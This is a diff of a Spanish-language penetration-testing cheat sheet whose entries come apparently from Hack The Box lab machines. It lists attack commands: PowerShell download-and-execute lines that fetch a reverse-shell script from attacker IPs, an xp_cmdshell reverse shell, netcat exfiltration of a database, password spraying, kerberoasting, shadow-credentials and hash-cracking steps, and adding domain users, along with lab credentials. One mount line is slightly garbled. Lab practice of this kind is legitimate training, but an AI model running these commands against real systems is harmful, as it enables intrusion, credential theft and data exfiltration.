@@ -81,7 +81,15 @@ Protocolo: "Comandos"
 Herramienta: "iex"
 Descripcion: Descargar un documento de otra computadora
 Comando: IEX(New-Object Net.WebClient).downloadString('http://10.10.14.65/PowerView.ps1')
-------------------------------------------------------------------------------------------------------------------------------------
+NOTA: En algunos casos colocar antes start /b powershell iex... para que se ponga en segunda plano y sea mediante powershell
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Transferencia de archivos"
+Protocolo: "Comandos"
+Herramienta: "iex"
+Descripcion: Migrarse a un proceso de 64 bits  
+Comando: start /b C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.16.5/Invoke-PowerShellTcp.ps1')
+NOTA: Es util cambiarse a un proceso de 64 bits para evitar falsos positivos al momento de enumerar el sistema o escalar privilegios 
+-----------------------------------------------------------------------------------------------------------------------------------
 Categoria: "Windows"
 Protocolo: "Comandos"
 Herramienta: "Get-ADDomain"
@@ -141,6 +149,7 @@ Protocolo: "Comandos"
 Herramienta: "dir"
 Descripcion: Busqueda de archivos especificos
 Comando: dir /s /r file.txt
+Comando: cmd /c dir /s /r user.txt 
 ------------------------------------------------------------------------------------------------------------------------------------
 Categoria: "Web"
 Protocolo: "Python"
@@ -599,10 +608,11 @@ Categoria: "Transferencia de archivos"
 Protocolo: "SMB"
 Herramienta: "impacket"
 Descripcion: Transferencia de archivos creando un recurso compartido con smb
-Comando: 
-1. impacket-smbserver smbFolder $(pwd) -smb2support
-2. copy Sharphound.exe \\10.10.14.10\smbFolder\Sharphound.exe <- Win to Linux
-3. copy \\10.10.14.4\smbFolder\test.txt . <- Linux to Win 
+Comando: impacket-smbserver smbFolder $(pwd) -smb2support
+Comando: copy Sharphound.exe \\10.10.14.10\smbFolder\Sharphound.exe <- Win to Linux
+Comando: copy \\10.10.14.4\smbFolder\test.txt . <- Linux to Win 
+Comando: New-PSDrive -Name "SharedFolder" -PSProvider "FileSystem" -Root "\\10.10.16.5\smbFolder" <- Linux to Win
+NOTA: Para el ultimo como creo una unidad logica para copiar el archivo debe ser copy SharedFolder:\file.txt C:\Users\kostas\Desktop\file.txt 
 ------------------------------------------------------------------------------------------------------------------------------------
 Categoria: "Active Directory"
 Protocolo: "SMB"             
@@ -1112,6 +1122,7 @@ Protocolo: "SMB"
 Herramienta: "psexec"
 Descripcion: Iniciar sesion por smb cuando marque un pwned
 Comando: impacket-psexec WORKGROUP/Administrator@10.10.110.213 cmd.exe
+Comando: psexec.py active.htb/Administrator:password@10.10.10.100 cmd.exe 
 ------------------------------------------------------------------------------------------------------------------------------------
 Categoria: "MSSQL"
 Protocolo: "MSSQL"
@@ -1121,14 +1132,14 @@ Comando: sqsh -S 10.10.110.58 -U 'sa'
 ------------------------------------------------------------------------------------------------------------------------------------
 Categoria: "MSSQL"
 Protocolo: "MSSQL"
-Herramienta: "invoke"
+Herramienta: "xp_cmdshell"
 Descripcion: Generar una reverse shell desde el servicio MSSQL
 Comando: xp_cmdshell "powershell IEX(New-Object Net.WebClient).downloadString(\"http://10.10.16.73/Invoke-PowerShellTcp.ps1\")"
 NOTA: Colocar un servidor temporal donde este el archivo Invoke-PowerShellTcp.ps1 y en otra terminal un listener por el puerto especificado 
 ------------------------------------------------------------------------------------------------------------------------------------
 Categoria: "MSSQL"
 Protocolo: "MSSQL"
-Herramienta: "impacket"
+Herramienta: "mssqlclient"
 Descripcion: Conectarse con el servicio MSSQL mediante mssqliclient.py
 Comando: python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py WORKGROUP/sa:x5Chuz8XbM@10.10.110.58
 ------------------------------------------------------------------------------------------------------------------------------------
@@ -1149,13 +1160,13 @@ Comando:
 ------------------------------------------------------------------------------------------------------------------------------------
 Categoria: "MSSQL"
 Protocolo: "MSSQL"
-Herramienta: "impacket"
+Herramienta: "xp_cmdshell"
 Descripcion: Ejecutar comandos mediante xp_cmdshell
 Comando: xp_cmdshell "whoami"
 ------------------------------------------------------------------------------------------------------------------------------------
 Categoria: "MSSQL"
 Protocolo: "MSSQL"
-Herramienta: "impacket"
+Herramienta: "xp_cmdshell"
 Descripcion: Habilitar xp_cmdshell 
 Comando: 
 1. sp_configure "xp_cmdshell", 1
@@ -1279,7 +1290,7 @@ NOTA: Agregar toda la ruta completa del archivo o marcara error
 ----------------------------------------------------------------------------------------------------------------------------------- 
 Categoria: "Active Directory"
 Protocolo: "Windows"
-Herramienta: "bloodhound"
+Herramienta: "net"
 Descripcion: Agregar usuarios al dominio
 Comando: net user p3rr1n admin123 /add net group "Exchange Windows Permissions" p3rr1n /add
 NOTA: Cuando el usuario comprometido forma parte del grupo Account operators tiene la capacidad de crear nuevos usuarios y agregarlos a nuevos grupos 
@@ -1309,10 +1320,9 @@ Categoria: "Active Directory"
 Protocolo: "SMB"
 Herramienta: "mount"
 Descripcion: Crear una montura de un recurso compartido
-Comando: 
-1. mkdir /mnt/smbmounted
-2. mount -t cifs //10.10.10.100/Users /mnt/smbmounted -o username=SVC_TGS,password=GPPstillStandingStrong2k18,domain=active.htb,rw
-3. mount -t cifs //10.10.10.100/Users /mnt/smbmounted
+Comando: mkdir /mnt/smbmounted
+Comando: mount -t cifs //10.10.10.100/Users /mnt/smbmounted -o username=SVC_TGS,password=GPPstillStandingStrong2k18,domain=active.htb,rw
+Comando:ount -t cifs //10.10.10.100/Users /mnt/smbmounted
 NOTA: Una vez que se tiene la montura ejecutar un tree -fas para ver todos los archivos de la montura con su ruta absoluta
 -----------------------------------------------------------------------------------------------------------------------------------
 Categoria: "Active Directory"
@@ -1688,10 +1698,240 @@ Protocolo: ""
 Herramienta: "vim"
 Descripcion: Realizar una sustitucion con vim 
 Comando: :%s/palabra_rempalazar/remplazo/g 
-
-
-
-
-
-
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Pentesting Web"
+Protocolo: "DNS"
+Herramienta: "dnsenum"
+Descripcion: Realizar ataque de transferencia de zona
+Comando: dnsenum zonetransfer.me
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Pentesting Web"
+Protocolo: "HTTP"
+Herramienta: "ffuf"
+Descripcion: Realizar enumeracion de usuarios en parametro (Con sesion autenticada)
+Comando: ffuf  -u 'http://nocturnal.htb/view.php?username=FUZZ&file=test.odt' -w /opt/xato-net-10-million-usernames.txt -H 'Cookie: PHPSESSID=dfu977bho02c7hrkcq2kgskgpe' -fs 2985
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Transferencia de archivos"
+Protocolo: "N/A"
+Herramienta: "nc"
+Descripcion: Transferencia de archivos usando netcat
+Comando: 
+1. nc -lvnp 4444 > nocturnal_database.db (En maquina local)
+2. nc 10.10.16.59 4444 < nocturnal_database.db (En maquina victima) 
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Cracking"
+Protocolo: "N/A"
+Herramienta: "john"
+Descripcion: Romper un hash md5
+Comando: john hashesh --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt 
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "SMB"
+Herramienta: "nxc"
+Descripcion: Obtener mas informacion de la maquina
+Comando: nxc smb 10.10.10.10 
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "SMB"
+Herramienta: "smbclient"
+Descripcion: Enumeraci[on de recursos mediante null session
+Comando: smbclient -L 10.10.10.10 -N 
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "SMB"
+Herramienta: "nxc"
+Descripcion: Validar credenciales en smb con nxc
+Comando: nxc smb 10.10.10.100 -u user -p 'pass'
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "SMB"
+Herramienta: "nxc"
+Descripcion: Validar credenciales en smb con nxc (cuando son credenciales a nivel de SO)
+Comando: nxc smb 10.10.10.100 -u user -p 'pass' -d WORKGROUP
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "SMB"
+Herramienta: "nxc"
+Descripcion: Listar recurso compartidos con nxc 
+Comando: nxc smb 10.10.10.100 -u user -p 'pass' --shares
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "RPC"
+Herramienta: "rpcclient"
+Descripcion: Obtener descripciones de los usuarios del dominio 
+Comando: rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.10.10.100 -c 'querydispinfo' 
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "Kerberos"
+Herramienta: "ntpdate"
+Descripcion: sincronizar el reloj de mi maquina ataquente con el de la maquina victima 
+Comando: ntpdate 10.10.10.100
+NOTA: Es importante sincronizar el reloj de mi maquina atacante con el de la victima para eviar errores en ataques a kerberos 
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "Kerberos"
+Herramienta: "kerbrute"
+Descripcion: Enumerar usuarios con kerbrute 
+Comando: ./kerbrute --dc 10.10.10.100 -d active.htb /usr/share/Seclist/Usernames/Names/names.txt
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "SMB"
+Herramienta: "smbclient"
+Descripcion: Entrar a un recurso compartido con smbclient 
+Comando: smbclient //10.10.10.100/Replication
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "Kerberos"
+Herramienta: "GetADUsers"
+Descripcion: Enumerar usuarios del AD cuando se tienen credenciales validas 
+Comando: python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -all -dc-ip 10.10.10.100 active.htb/svc_tgs 
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "NA"
+Herramienta: "regex"
+Descripcion: Expresion regular para filtrar todos los datos dentro de corchetes
+Comando: grep -oP '\[.*?\]' | grep -v '0x' | tr -d '[]' 
+NOTA: Util para filtrar los usuarios que obtengo de rpcclient
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "WINRM"
+Herramienta: "evil-winrm"
+Descripcion: Conectarse mediante evil-winrm
+Comando: evil-winrm -i 10.10.10.161 -u user -p 'pass' 
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "SMB"
+Herramienta: "nxc"
+Descripcion: Realizar un password spray probando linea primer usuario con primer contrasena, segundo usuario con segunda pass y asi consecutivamente
+Comando: nxc smb 10.10.10.172 -u users_monteverde -p users_monteverde --continue-on-success --no-bruteforce
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "SMB"
+Herramienta: "smbclient"
+Descripcion: Conectarse a un recurso compartido con credenciales
+Comando: smbclient //10.10.10.100/Replication -U "user%password"
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "SMB"
+Herramienta: "smbmap"
+Descripcion: Buscar recursivamente multiples cosas
+Comando: smbmap -u SABatchJobs -p SABatchJobs -d megabank -H 10.10.10.172 -A '(xlsx|docx|txt|xml)' -R
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Procesamiento de texto"
+Protocolo: "TCP"
+Herramienta: "regex"
+Descripcion: Expresion regular para extraer los puertos de un escaneo nmap
+Comando: cat target.nmap | grep -oP '\d{1,5}/tcp' | awk '{print $1}' FS='/'  
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "MSSQL"
+Protocolo: "MSSQL"
+Herramienta: "sqsh"
+Descripcion: Enumerar las tablas de una base de datos 
+Comando: SELECT TABLE_NAME FROM namedb.INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';
+Comando: SELECT * FROM orcharddb.INFORMATION_SCHEMA.TABLES
+NOTA: Despues de ejecutar el comando de arriba, ejecutar: go -m csv > output.csv crear un archivo donde se ven mejor visualmente 
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "MSSQL"
+Protocolo: "MSSQL"
+Herramienta: "sqsh"
+Descripcion: Enumerar las columnas de una base de datos 
+Comando: use name_database;
+Comando: SELECT * FROM name_table;
+NOTA: Despues de ejecutar el comando de arriba, ejecutar: go -m html > index.html creara un archivo donde se ven mejor visualmente cuando vienen pass
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "SMB"
+Herramienta: "smbclient"
+Descripcion: Enumerar los recursos compartidos ejecutando un dir en cada uno de ellos para ver su contenido  
+Comando: echo; smbclient -L 10.10.10.52 -U James%J@m3s_P@ssW0rd\! 2>/dev/null | grep "Disk" | awk '{print $1}' | while read sharedFolder; do echo "===${sharedFolder}==="; smbclient //10.10.10.52/${sharedFolder} -U James%J@m3s_P@ssW0rd\! -c dir; echo; done
+NOTA: Cambiar el usuario y contrasena
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "MSSQL"
+Protocolo: "MSSQL"
+Herramienta: "sqsh"
+Descripcion: Enumerar todas las bases de datos de la maquina
+Comando: SELECT name FROM master.dbo.sysdatabases
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directroy"
+Protocolo: "SMB"
+Herramienta: "nxc"
+Descripcion: Validar si unas credenciales son validas a nivel de "equipo" y no de dominio
+Comando: nxc smb 10.10.10.125 -u 'reporting' -p 'PcwTWTHRwryjc$c6' -d WORKGROUP
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "MSSQL"
+Protocolo: "MSSQL"
+Herramienta: "mssqlclient"
+Descripcion: Conectarse con mssql utilizanod las credenciales de windows en lugar de las credenciales de SQL Server
+Comando: $(locate mssqlclient.py) WORKGROUP/reporting@10.10.10.125 -windows-auth
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "SMB"
+Herramienta: "responder"
+Descripcion: Ejecutar responder para capturar hash
+Comando: responder -I tun0
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "N/A"
+Herramienta: "bloodyAD"
+Descripcion: Agregar un usuario a otro grupo  
+Comando: bloodyAD --host '10.10.11.69' -d 'dc01.fluffy.htb' -u 'p.agila' -p 'prometheusx-303'  add groupMember 'SERVICE ACCOUNTS' p.agila
+NOTA: Es neceseario el privilegio Generic All sobre el grupo
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "Kerberos"
+Herramienta: "certipy-ad"
+Descripcion: Realizar ataque shadow credentials  
+Comando: certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303'  -account 'LDAP_SVC'  -dc-ip '10.10.11.69'
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "Kerberos"
+Herramienta: "certipy-ad"
+Descripcion: Enumeracion de vulnerabilidades con certipy   
+Comando: certipy find -u 'ca_svc' -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -vulnerable -enabled -text
+NOTA: Utilizar la ultima version del git por que la de kali esta desactualziada y no muestra todas las vulnes
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Cracking"
+Protocolo: "N/A"
+Herramienta: "hashcat"
+Descripcion: Romper un hash NTLMv2 con hashcat   
+Comando: hashcat -m 5600 hash /usr/share/wordlist/rockyou.txt --force
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "Kerberos"
+Herramienta: "nxc"
+Descripcion: Ataque kerberoasting desde nxc
+Comando: nxc ldap 10.10.11.69 -u p.agila -p 'prometheusx-303' --kerberoasting output_kerb.txt
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Cracking"
+Protocolo: "Kerberos"
+Herramienta: "hashcat"
+Descripcion: Romper un hash kerberoasting
+Comando: hashcat -m 13100 output_kerberoasting.txt /usr/shar/wordlist/rockyou.txt --force
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "Kerberos"
+Herramienta: "bloodhound"
+Descripcion: Ejecutar bloodhound remotamente con credenciales
+Comando: bloodhound-ce-python -c all -d fluffy.htb -u p.agila -p 'prometheusx-303' -ns 10.10.11.69 -dc dc01.fluffy.htb --zip
+NOTA: Genera un zip pero hay que descomprimirlo, si se carga el zip comprimido en bloodhound no carga todos los datos completos
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "SNMP"
+Herramienta: "onesixtyone"
+Descripcion: Ataque de fuerza bruta para detectar comunity strings validas
+Comando: onesixtyone -c /usr/share/seclist/Discovery/SNMP/snmp.txt 10.10.10.10
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "SNMP"
+Herramienta: "snmpbulkwalk
+Descripcion: Ataque de fuerza bruta para detectar comunity strings validas
+Comando: snmpbulkwalk -v2 -c public 10.10.10.10
+Comando: snmpbulkwalk -v2 -c public 10.10.10.10 1
+NOTA: Probar el primer comando y si no sale nada ejecutar el segundo que busca mas informacion
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "NA"
+Herramienta: "regex"
+Descripcion: Expresion regular para filtrar direcciones IP
+Comando: grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' 
 
